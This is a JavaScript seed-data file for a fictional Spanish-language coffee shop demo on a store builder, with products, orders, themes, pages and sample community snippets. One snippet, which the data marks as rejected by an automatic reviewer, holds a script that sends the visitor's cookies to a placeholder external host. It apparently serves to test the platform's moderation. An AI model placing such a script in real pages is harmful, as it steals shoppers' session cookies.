// Datos de la tienda de prueba "Café Aurora" (ficticia, solo para probar el sistema).
export const uid = (p = 'id') => p + '_' + Math.random().toString(36).slice(2, 9);

// Fotos de Unsplash (licencia libre). Se piden recortadas al tamaño justo.
const img = (id, w = 900, h = 900) => `https://images.unsplash.com/photo-${id}?w=${w}&h=${h}&fit=crop&auto=format&q=75`;

export const seedProducts = [
  { id: 'p1', title: 'Café de origen Huila 500 g', slug: 'cafe-huila', price: 42000, compareAt: 48000, cost: 21000, sku: 'CAF-HUI-500', stock: 120, status: 'activo', collection: 'cafes', tags: ['origen', 'suave'], image: img('1587734195503-904fca47e0e9'), description: 'Notas de panela, durazno y cacao. Tostión media, ideal para filtrados.', vendor: 'Café Aurora' },
  { id: 'p2', title: 'Café de origen Nariño 500 g', slug: 'cafe-narino', price: 46000, compareAt: null, cost: 23000, sku: 'CAF-NAR-500', stock: 64, status: 'activo', collection: 'cafes', tags: ['origen', 'frutal'], image: img('1447933601403-0c6688de566e'), description: 'Acidez brillante, notas cítricas y de frutos rojos.', vendor: 'Café Aurora' },
  { id: 'p3', title: 'Blend Espresso Aurora 1 kg', slug: 'blend-espresso', price: 78000, compareAt: 89000, cost: 38000, sku: 'BLE-ESP-1K', stock: 35, status: 'activo', collection: 'cafes', tags: ['espresso'], image: img('1610889556528-9a770e32642f'), description: 'Cuerpo alto y crema persistente. Pensado para máquinas de espresso.', vendor: 'Café Aurora' },
  { id: 'p4', title: 'Kit de filtrado Chemex', slug: 'kit-filtrado', price: 95000, compareAt: null, cost: 52000, sku: 'ACC-PRE-600', stock: 18, status: 'activo', collection: 'accesorios', tags: ['accesorio'], image: img('1442512595331-e89e73853f31'), description: 'Cafetera de vidrio, hervidor de cuello de cisne y 100 filtros.', vendor: 'Café Aurora' },
  { id: 'p5', title: 'Set barista para espresso', slug: 'set-barista', price: 120000, compareAt: 140000, cost: 64000, sku: 'ACC-MOL-01', stock: 9, status: 'activo', collection: 'accesorios', tags: ['accesorio'], image: img('1511920170033-f8396924c348'), description: 'Portafiltro, tamper y jarra para leche. Todo para tu espresso en casa.', vendor: 'Café Aurora' },
  { id: 'p6', title: 'Taza de vidrio doble pared', slug: 'taza-vidrio', price: 38000, compareAt: null, cost: 15000, sku: 'ACC-TAZ-01', stock: 0, status: 'borrador', collection: 'accesorios', tags: ['merch'], image: img('1521302080334-4bebac2763a6'), description: 'Taza de 350 ml que mantiene el calor.', vendor: 'Café Aurora' },
];

export const seedCollections = [
  { id: 'cafes', title: 'Cafés', description: 'Cafés de origen y blends tostados cada semana.' },
  { id: 'accesorios', title: 'Accesorios', description: 'Todo para preparar en casa.' },
];

const daysAgo = (d, h = 10) => { const t = new Date(); t.setDate(t.getDate() - d); t.setHours(h, 15, 0, 0); return t.toISOString(); };

export const seedCustomers = [
  { id: 'c1', name: 'Laura Gómez', email: 'laura@example.com', phone: '+57 300 000 0001', city: 'Bogotá', tags: ['vip'], marketing: true },
  { id: 'c2', name: 'Andrés Ruiz', email: 'andres@example.com', phone: '+57 300 000 0002', city: 'Medellín', tags: [], marketing: true },
  { id: 'c3', name: 'Camila Torres', email: 'camila@example.com', phone: '+57 300 000 0003', city: 'Cali', tags: ['mayorista'], marketing: false },
  { id: 'c4', name: 'Julián Pérez', email: 'julian@example.com', phone: '+57 300 000 0004', city: 'Barranquilla', tags: [], marketing: true },
];

const line = (pid, qty) => { const p = seedProducts.find(x => x.id === pid); return { productId: pid, title: p.title, price: p.price, qty, image: p.image }; };
const order = (n, cid, items, d, payment, fulfillment, channel = 'Tienda online') => {
  const subtotal = items.reduce((s, i) => s + i.price * i.qty, 0);
  const shipping = subtotal > 150000 ? 0 : 12000;
  return { id: 'o' + n, number: 1000 + n, customerId: cid, items, subtotal, shipping, discount: 0, total: subtotal + shipping, payment, fulfillment, channel, createdAt: d, notes: '' };
};

export const seedOrders = [
  order(1, 'c1', [line('p1', 2), line('p4', 1)], daysAgo(13), 'pagado', 'enviado'),
  order(2, 'c2', [line('p3', 1)], daysAgo(11), 'pagado', 'enviado'),
  order(3, 'c3', [line('p1', 6), line('p2', 6)], daysAgo(9), 'pagado', 'enviado', 'Mayorista'),
  order(4, 'c4', [line('p5', 1)], daysAgo(7), 'pagado', 'enviado'),
  order(5, 'c1', [line('p2', 1)], daysAgo(5), 'pagado', 'preparado'),
  order(6, 'c2', [line('p3', 2)], daysAgo(3), 'pendiente', 'sin preparar'),
  order(7, 'c4', [line('p1', 1), line('p5', 1)], daysAgo(1), 'pagado', 'sin preparar'),
  order(8, 'c3', [line('p4', 2)], daysAgo(0), 'pendiente', 'sin preparar', 'WhatsApp'),
];

export const seedDiscounts = [
  { id: 'd1', code: 'BIENVENIDA10', type: 'porcentaje', value: 10, minSubtotal: 0, uses: 14, limit: null, active: true },
  { id: 'd2', code: 'ENVIOGRATIS', type: 'envio', value: 0, minSubtotal: 80000, uses: 6, limit: 100, active: true },
];

export const defaultTheme = {
  name: 'Aurora',
  primary: '#7a3e1d',
  accent: '#e9b872',
  background: '#fbf7f2',
  surface: '#ffffff',
  text: '#2b1d14',
  muted: '#7b6a5e',
  headingFont: 'Playfair Display',
  bodyFont: 'Inter',
  radius: 14,
  buttonStyle: 'relleno',
  width: 1200,
};

export const themePresets = [
  { ...defaultTheme },
  { name: 'Minimal', primary: '#111111', accent: '#d4d4d4', background: '#ffffff', surface: '#f6f6f6', text: '#111111', muted: '#6b6b6b', headingFont: 'Inter', bodyFont: 'Inter', radius: 4, buttonStyle: 'relleno', width: 1180 },
  { name: 'Neón', primary: '#7c3aed', accent: '#22d3ee', background: '#0b0b14', surface: '#151527', text: '#f4f4ff', muted: '#a3a3c2', headingFont: 'Space Grotesk', bodyFont: 'Inter', radius: 18, buttonStyle: 'relleno', width: 1240 },
  { name: 'Editorial', primary: '#1f3a2e', accent: '#c8a96a', background: '#f3efe6', surface: '#ffffff', text: '#1d1d1b', muted: '#6d6a60', headingFont: 'DM Serif Display', bodyFont: 'Inter', radius: 0, buttonStyle: 'contorno', width: 1160 },
];

const s = (type, settings) => ({ id: uid('s'), type, hidden: false, settings });

export const seedPages = [
  {
    id: 'home', title: 'Inicio', slug: '', kind: 'inicio',
    seo: { title: 'Café Aurora — café de especialidad', description: 'Café colombiano de especialidad tostado cada semana.' },
    sections: [
      s('announcement', { text: 'Envío gratis en pedidos desde $150.000 · Tostado cada lunes' }),
      s('header', { logo: 'Café Aurora', sticky: true }),
      s('hero', { eyebrow: 'Nueva cosecha 2026', title: 'Café de especialidad, tostado para ti', subtitle: 'Granos de pequeños productores colombianos. Del cultivo a tu taza en menos de 7 días.', button: 'Comprar ahora', link: '#/tienda/coleccion/cafes', button2: 'Nuestra historia', link2: '#/tienda/p/nosotros', image: img('1497935586351-b67a49e012bf', 1800, 1000), align: 'izquierda', height: 'alto', overlay: 45 }),
      s('logos', { title: 'Nos han mencionado', items: [{ text: 'Revista Barista' }, { text: 'Coffee Lab' }, { text: 'Gastro Bogotá' }, { text: 'Origen Mag' }] }),
      s('featured', { title: 'Los más vendidos', subtitle: 'Elegidos por nuestra comunidad', collection: 'todas', count: 4, columns: 4 }),
      s('image-text', { image: img('1498804103079-a6351b050096', 1200, 900), title: 'Del grano a tu taza', text: 'Compramos a precio justo a 40 familias del Huila y Nariño. Sabes exactamente de dónde viene cada bolsa.', button: 'Conocer productores', link: '#/tienda/p/nosotros', side: 'izquierda' }),
      s('features', { title: '¿Por qué Aurora?', items: [{ icon: '🔥', title: 'Tostado semanal', text: 'Nunca más de 7 días desde el tueste.' }, { icon: '🌱', title: 'Comercio justo', text: 'Pagamos 2x el precio de bolsa.' }, { icon: '🚚', title: 'Envío 24-48 h', text: 'A las principales ciudades.' }] }),
      s('testimonials', { title: 'Lo que dicen', items: [{ quote: 'El mejor café que he probado en casa.', author: 'Laura G.' }, { quote: 'Llega rapidísimo y huele increíble.', author: 'Andrés R.' }, { quote: 'La suscripción me cambió las mañanas.', author: 'Camila T.' }] }),
      s('faq', { title: 'Preguntas frecuentes', items: [{ q: '¿Muelen el café?', a: 'Sí, elige grano o molido para filtro, espresso o prensa.' }, { q: '¿Cuánto tarda el envío?', a: 'Entre 24 y 48 horas hábiles en ciudades principales.' }, { q: '¿Tienen suscripción?', a: 'Muy pronto. Déjanos tu correo y te avisamos.' }] }),
      s('newsletter', { title: 'Únete al club Aurora', text: '10% de descuento en tu primera compra y noticias de cada cosecha.', button: 'Suscribirme' }),
      s('footer', { text: 'Café Aurora · Tienda de prueba creada con Nexlora Shop', columns: [{ title: 'Tienda', links: 'Cafés, Accesorios' }, { title: 'Ayuda', links: 'Envíos, Devoluciones, Contacto' }] }),
    ],
  },
  {
    id: 'nosotros', title: 'Nosotros', slug: 'nosotros', kind: 'pagina',
    seo: { title: 'Nuestra historia — Café Aurora', description: 'Quiénes somos.' },
    sections: [
      s('header', { logo: 'Café Aurora', sticky: true }),
      s('rich-text', { title: 'Nuestra historia', text: 'Aurora nació en 2026 con una idea simple: que el café que llega a tu casa sea igual de bueno que el que toman los productores.', align: 'centro' }),
      s('gallery', { title: 'Nuestro café', items: [{ image: img('1501339847302-ac426a4a7cbb', 800, 800) }, { image: img('1495474472287-4d71bcdd2085', 800, 800) }, { image: img('1461023058943-07fcbe16d735', 800, 800) }] }),
      s('cta', { title: '¿Listo para probarlo?', text: 'Usa BIENVENIDA10 en tu primera compra.', button: 'Ver cafés', link: '#/tienda/coleccion/cafes' }),
      s('footer', { text: 'Café Aurora · Tienda de prueba creada con Nexlora Shop', columns: [] }),
    ],
  },
];

export const seedMenus = [
  { id: 'principal', title: 'Menú principal', items: [{ label: 'Inicio', link: '#/tienda' }, { label: 'Preventa 🔥', link: '#/tienda/p/preventa' }, { label: 'Cafés', link: '#/tienda/coleccion/cafes' }, { label: 'Accesorios', link: '#/tienda/coleccion/accesorios' }, { label: 'Nosotros', link: '#/tienda/p/nosotros' }] },
];

export const seedSettings = {
  storeName: 'Café Aurora',
  email: 'hola@cafeaurora.test',
  currency: 'COP',
  locale: 'es-CO',
  timezone: 'America/Bogota',
  taxRate: 19,
  taxIncluded: true,
  shippingRates: [{ id: 'r1', name: 'Estándar (24-48 h)', price: 12000, freeFrom: 150000 }, { id: 'r2', name: 'Recoger en tienda', price: 0, freeFrom: null }],
  policies: { devoluciones: 'Tienes 30 días para devolver productos sin abrir.', privacidad: 'Solo usamos tus datos para procesar tu pedido.', envios: 'Enviamos a todo el país.', terminos: 'Al comprar aceptas estos términos.' },
  password: false,
  staff: [{ name: 'Dueño de la tienda', role: 'Propietario' }],
};

// Ajustes del checkout (en otras plataformas personalizarlo suele exigir el plan más caro).
export const defaultCheckout = {
  whatsapp: '573000000000',
  whatsappOrder: true,
  requirePhone: true,
  orderNotes: true,
  trustText: 'Pago seguro · Devolución gratis en 30 días · Atención por WhatsApp',
  thanksText: 'Te escribiremos por WhatsApp para coordinar la entrega.',
};

const ago = d => { const t = new Date(); t.setDate(t.getDate() - d); return t.toISOString(); };

// Envíos de ejemplo para la comunidad de código (autores ficticios de la demo).
export const seedCommunity = [
  {
    id: 'cc1', name: 'Banner con degradado animado', author: 'Ejemplo de la comunidad', category: 'Destacado', installs: 128, submittedAt: ago(20), status: 'aprobado',
    review: { by: 'Equipo Nexlora', note: 'Limpio, solo CSS. Aprobado.', at: ago(18) },
    description: 'Un banner llamativo con un degradado que se mueve suavemente. Usa los colores de tu tema.',
    height: 260,
    html: '<section class="b"><p class="k">Edición limitada</p><h2>Nueva cosecha disponible</h2><p>Solo 200 bolsas este mes.</p></section>',
    css: '.b{height:260px;display:grid;place-content:center;text-align:center;color:#fff;padding:24px;background:linear-gradient(120deg,var(--primario),var(--acento),var(--primario));background-size:300% 300%;animation:m 8s ease infinite;border-radius:var(--radio)}.b h2{font-family:var(--fuente-titulos);font-size:clamp(26px,5vw,44px);margin:6px 0}.b p{margin:0;opacity:.9}.k{text-transform:uppercase;letter-spacing:.2em;font-size:12px}@keyframes m{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}',
  },
  {
    id: 'cc2', name: 'Tabla comparativa', author: 'Ejemplo de la comunidad', category: 'Productos', installs: 64, submittedAt: ago(15), status: 'aprobado',
    review: { by: 'Equipo Nexlora', note: 'Accesible y responsive. Aprobado.', at: ago(14) },
    description: 'Compara tu producto con "los demás" en una tabla clara. Ideal para landing pages.',
    height: 330,
    html: '<div class="t"><h3>¿Por qué nosotros?</h3><table><tr><th></th><th>Nosotros</th><th>Otros</th></tr><tr><td>Tostado reciente</td><td>✔</td><td>✘</td></tr><tr><td>Origen trazable</td><td>✔</td><td>✘</td></tr><tr><td>Envío 24-48 h</td><td>✔</td><td>✔</td></tr><tr><td>Precio justo al productor</td><td>✔</td><td>✘</td></tr></table></div>',
    css: '.t{max-width:640px;margin:0 auto;padding:16px}.t h3{font-family:var(--fuente-titulos);text-align:center;font-size:28px;margin:0 0 16px}table{width:100%;border-collapse:collapse;background:var(--superficie);border-radius:var(--radio);overflow:hidden}th,td{padding:12px 14px;text-align:center;border-bottom:1px solid rgba(127,127,127,.18)}td:first-child,th:first-child{text-align:left}th:nth-child(2),td:nth-child(2){color:var(--primario);font-weight:700}',
  },
  {
    id: 'cc3', name: 'Sello de garantía', author: 'Ejemplo de la comunidad', category: 'Confianza', installs: 41, submittedAt: ago(9), status: 'aprobado',
    review: { by: 'Equipo Nexlora', note: 'Aprobado.', at: ago(8) },
    description: 'Tres sellos de confianza en fila: pago seguro, devolución y garantía.',
    height: 170,
    html: '<div class="s"><div><b>🔒</b><span>Pago 100% seguro</span></div><div><b>↩</b><span>30 días de devolución</span></div><div><b>★</b><span>Garantía de frescura</span></div></div>',
    css: '.s{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;padding:20px}.s div{flex:1 1 150px;max-width:220px;background:var(--superficie);border:2px dashed var(--acento);border-radius:var(--radio);padding:16px;text-align:center}.s b{display:block;font-size:26px;color:var(--primario)}.s span{font-size:14px}',
  },
  {
    id: 'cc4', name: 'Aviso flotante de descuento', author: 'Ejemplo de la comunidad', category: 'Marketing', installs: 0, submittedAt: ago(1), status: 'pendiente', review: null,
    description: 'Una cinta fija abajo de la pantalla con un código de descuento.',
    height: 120,
    html: '<div class="f">Usa <b>BIENVENIDA10</b> y ahorra 10% en tu primera compra</div>',
    css: '.f{position:fixed;left:12px;right:12px;bottom:12px;background:var(--texto);color:var(--fondo);padding:14px;border-radius:var(--radio);text-align:center}',
  },
  {
    id: 'cc5', name: 'Contador de visitas en vivo', author: 'Ejemplo de la comunidad', category: 'Marketing', installs: 0, submittedAt: ago(3), status: 'rechazado',
    review: { by: 'Revisor automático', note: 'Rechazado: usa <script> y envía datos a un servidor externo.', at: ago(3) },
    description: 'Muestra cuánta gente está viendo el producto.',
    height: 120,
    html: '<div id="c">12 personas viendo esto</div><script>fetch("http://otro-sitio.example/track?c="+document.cookie)</script>',
    css: '#c{padding:12px;text-align:center}',
  },
];
